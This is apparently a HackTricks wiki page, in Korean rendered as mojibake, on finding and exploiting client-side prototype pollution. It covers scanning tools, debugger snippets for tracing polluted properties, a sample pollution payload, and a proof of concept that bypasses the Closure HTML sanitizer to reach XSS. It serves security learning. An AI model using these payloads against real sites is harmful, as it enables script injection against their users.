# í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ìë™ ë„êµ¬ë¥¼ ì‚¬ìš©í•œ ë°œê²¬

ë„êµ¬ [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ë°** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) ë¥¼ ì‚¬ìš©í•˜ì—¬ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì **ì„ **ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ë˜í•œ, **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨** [**PPScan**](https://github.com/msrkp/PPScan)ì„ ì‚¬ìš©í•˜ì—¬ **ì ‘ì†í•˜ëŠ” í˜ì´ì§€**ë¥¼ **ìë™ìœ¼ë¡œ** **ìŠ¤ìº”**í•˜ì—¬ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì†ì„±ì´ ì‚¬ìš©ë˜ëŠ” ìœ„ì¹˜ ë””ë²„ê¹… <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Prototype Pollutionì˜ ê·¼ë³¸ ì›ì¸ ì°¾ê¸° <a href="#id-5530" id="id-5530"></a>

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ì·¨ì•½ì ì´ ë„êµ¬ì— ì˜í•´ ì‹ë³„ë˜ë©´, ì½”ë“œê°€ ì§€ë‚˜ì¹˜ê²Œ ë³µì¡í•˜ì§€ ì•Šì€ ê²½ìš°, Chrome ê°œë°œì ë„êµ¬ì—ì„œ `location.hash`, `decodeURIComponent` ë˜ëŠ” `location.search`ì™€ ê°™ì€ í‚¤ì›Œë“œë¥¼ ê²€ìƒ‰í•˜ì—¬ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ JavaScript ì½”ë“œì˜ ì·¨ì•½í•œ ë¶€ë¶„ì„ ì •í™•íˆ ì°¾ì•„ë‚´ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

ë” í¬ê³  ë³µì¡í•œ ì½”ë“œë² ì´ìŠ¤ì˜ ê²½ìš°, ì·¨ì•½í•œ ì½”ë“œë¥¼ ë°œê²¬í•˜ëŠ” ê°„ë‹¨í•œ ë°©ë²•ì€ ë‹¤ìŒ ë‹¨ê³„ë¥¼ í¬í•¨í•©ë‹ˆë‹¤:

1. ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ìƒì„±ìì—ì„œ ì†ì„±ì„ ì„¤ì •í•˜ë„ë¡ ì„¤ê³„ëœ í˜ì´ë¡œë“œë¥¼ ì–»ìŠµë‹ˆë‹¤. ppmapì—ì„œ ì œê³µí•˜ëŠ” ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: `constructor[prototype][ppmap]=reserved`.
2. í˜ì´ì§€ì—ì„œ ì‹¤í–‰ë  JavaScript ì½”ë“œì˜ ì²« ë²ˆì§¸ ì¤„ì— ì¤‘ë‹¨ì ì„ ì„¤ì •í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œë¡œ í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹˜ê³  ì´ ì¤‘ë‹¨ì ì—ì„œ ì‹¤í–‰ì„ ì¼ì‹œ ì¤‘ì§€í•©ë‹ˆë‹¤.
3. JavaScript ì‹¤í–‰ì´ ì¼ì‹œ ì¤‘ì§€ëœ ë™ì•ˆ, JS ì½˜ì†”ì—ì„œ ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” 'ppmap' ì†ì„±ì´ ìƒì„±ë  ë•Œ ì‹ í˜¸ë¥¼ ë³´ë‚´ì–´ ê·¸ ì¶œì²˜ë¥¼ ì°¾ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **ì†ŒìŠ¤** íƒ­ìœ¼ë¡œ ëŒì•„ê°€ì„œ â€œìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì¬ê°œâ€ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. JavaScriptëŠ” ê³„ì† ì‹¤í–‰ë˜ë©°, 'ppmap' ì†ì„±ì´ ì˜ˆìƒëŒ€ë¡œ ì˜¤ì—¼ë©ë‹ˆë‹¤. ì œê³µëœ ìŠ¤ë‹ˆí«ì„ í™œìš©í•˜ë©´ 'ppmap' ì†ì„±ì´ ì˜¤ì—¼ë˜ëŠ” ì •í™•í•œ ìœ„ì¹˜ë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í˜¸ì¶œ ìŠ¤íƒ**ì„ ê²€ì‚¬í•˜ë©´ ì˜¤ì—¼ì´ ë°œìƒí•œ ë‹¤ì–‘í•œ ìŠ¤íƒì„ ê´€ì°°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì–´ë–¤ ìŠ¤íƒì„ ì¡°ì‚¬í• ì§€ ê²°ì •í•  ë•Œ, JavaScript ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ê³¼ ê´€ë ¨ëœ ìŠ¤íƒì„ ëª©í‘œë¡œ í•˜ëŠ” ê²ƒì´ ìœ ìš©í•©ë‹ˆë‹¤. í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì€ ì´ëŸ¬í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì—ì„œ ìì£¼ ë°œìƒí•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ íŒŒì¼ì— ì—°ê²°ëœ ìŠ¤íƒì„ ê²€ì‚¬í•˜ì—¬ ê´€ë ¨ ìŠ¤íƒì„ ì‹ë³„í•©ë‹ˆë‹¤(ì˜¤ë¥¸ìª½ì— í‘œì‹œëœ ì´ë¯¸ì§€ì™€ ìœ ì‚¬í•˜ê²Œ). 4í–‰ê³¼ 6í–‰ê³¼ ê°™ì´ ì—¬ëŸ¬ ìŠ¤íƒì´ ìˆëŠ” ê²½ìš°, 4í–‰ì˜ ìŠ¤íƒì´ ë…¼ë¦¬ì ì¸ ì„ íƒì…ë‹ˆë‹¤. ì´ëŠ” ì˜¤ì—¼ì˜ ì´ˆê¸° ë°œìƒì„ ë‚˜íƒ€ë‚´ë©°, ë”°ë¼ì„œ ì·¨ì•½ì ì˜ ê·¼ë³¸ ì›ì¸ì…ë‹ˆë‹¤. ìŠ¤íƒì„ í´ë¦­í•˜ë©´ ì·¨ì•½í•œ ì½”ë“œë¡œ ì´ë™í•©ë‹ˆë‹¤.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ìŠ¤í¬ë¦½íŠ¸ ê°€ì ¯ ì°¾ê¸°

ê°€ì ¯ì€ **PP ì·¨ì•½ì ì´ ë°œê²¬ë˜ë©´ ì•…ìš©ë  ì½”ë“œ**ì…ë‹ˆë‹¤.

ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ê°„ë‹¨í•˜ë‹¤ë©´, **`srcdoc/innerHTML/iframe/createElement`**ì™€ ê°™ì€ **í‚¤ì›Œë“œ**ë¥¼ **ê²€ìƒ‰**í•˜ê³  ì†ŒìŠ¤ ì½”ë“œë¥¼ ê²€í† í•˜ì—¬ **JavaScript ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§€ëŠ”ì§€** í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë•Œë•Œë¡œ ì–¸ê¸‰ëœ ê¸°ìˆ ì´ ê°€ì ¯ì„ ì „í˜€ ì°¾ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ê²½ìš°, ìˆœìˆ˜ ì†ŒìŠ¤ ì½”ë“œ ê²€í† ë¥¼ í†µí•´ ì•„ë˜ ì˜ˆì™€ ê°™ì€ ë©‹ì§„ ê°€ì ¯ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Mithil ë¼ì´ë¸ŒëŸ¬ë¦¬ ì½”ë“œì—ì„œ PP ê°€ì ¯ ì°¾ê¸° ì˜ˆì‹œ

ì´ ê¸€ì„ í™•ì¸í•˜ì„¸ìš”: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## ì·¨ì•½í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ìœ„í•œ í˜ì´ë¡œë“œ ì¬ì»´íŒŒì¼

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPë¥¼ í†µí•œ HTML ì„¸ì •ê¸° ìš°íšŒ

[**ì´ ì—°êµ¬**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)ëŠ” ì¼ë¶€ HTML ì„¸ì •ê¸° ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì œê³µí•˜ëŠ” **ì„¸ì •ê¸°ë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ ì‚¬ìš©í•  PP ê°€ì ¯**ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## References

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
